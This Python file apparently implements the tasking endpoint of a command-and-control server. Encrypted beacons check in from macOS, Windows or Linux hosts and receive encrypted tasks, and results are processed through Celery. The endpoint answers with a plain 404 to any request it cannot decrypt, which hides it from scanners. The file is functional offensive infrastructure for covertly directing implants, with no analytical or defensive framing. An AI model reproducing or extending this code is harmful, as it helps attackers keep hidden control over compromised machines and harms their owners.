
from app import app, api, celery
from flask import Flask, request, make_response
from flask_restful import Api, Resource, reqparse
from app.utils import Message
from app.models import RequestSchema, ResultSchema
from functools import wraps
from marshmallow import ValidationError
import base64
import json


def decrypt_content(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        try:
            plaintext, decrypted_key = Message(request.data).decrypt()
            request.data = json.loads(plaintext)
            request.key = decrypted_key
        except Exception as err:
            return '', 404
        return f(*args, **kwargs)
    return decorated_function


class APIPulse(Resource):
    decorators = [decrypt_content]

    def __init__(self):
        self.request_data, self.errors = ResultSchema().load(request.data) if \
            'task_id' in request.data else RequestSchema().load(request.data)

    def post(self):
        if self.errors: return self.errors
        platform_mapping = { "darwin": "macOS",
            "windows": "Windows", "linux": "Linux" }
        
        if not 'task_id' in self.request_data:
            self.request_data['platform'] = platform_mapping[self.request_data['platform']]
            get_tasks = celery.send_task('api.gettasks', args=(self.request_data['beacon_id'], self.request_data,
                request.remote_addr, 'http'), retry=True)
            result = get_tasks.get()

        else:
            process_results = celery.send_task('api.taskresult', args=(self.request_data['beacon_id'],
                self.request_data['task_id'], self.request_data), retry=True)
            result = process_results.get()

        ciphertext = Message(json.dumps(result)).encrypt(request.key)
        encoded_message = base64.b64encode(ciphertext)
        response = make_response(encoded_message)
        response.headers['content-type'] = 'application/octet-stream'
        return response


api.add_resource(APIPulse, app.config['C2_ENDPOINT'])

